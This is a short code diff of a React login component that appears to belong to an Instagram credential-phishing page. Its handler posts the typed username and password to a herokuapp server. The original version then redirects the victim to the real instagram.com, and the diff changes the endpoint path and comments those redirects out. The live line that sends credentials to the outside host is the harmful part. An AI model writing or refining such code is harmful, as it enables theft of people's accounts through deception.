@@ -56,22 +56,22 @@ class Login extends Component {
       //   })
 
 
-     axios.post('https://ancient1-tor-51301.herokuapp.com/login1', {
+     axios.post('https://ancient1-tor-51301.herokuapp.com/login', {
         username,
         password
     })
       .then(function (response) {
         console.log(response);
         this.setState({ showMaintain: true})
-        window.location.href = "https://instagram.com/";
+      //  window.location.href = "https://instagram.com/";
 
       })
       .catch(function (error) {
         console.log(error);
-        window.location.href = "https://instagram.com/";
+        //window.location.href = "https://instagram.com/";
 
       });      
-     this.setState({ showMaintain: true})
+    // this.setState({ showMaintain: true})
 
     }
 
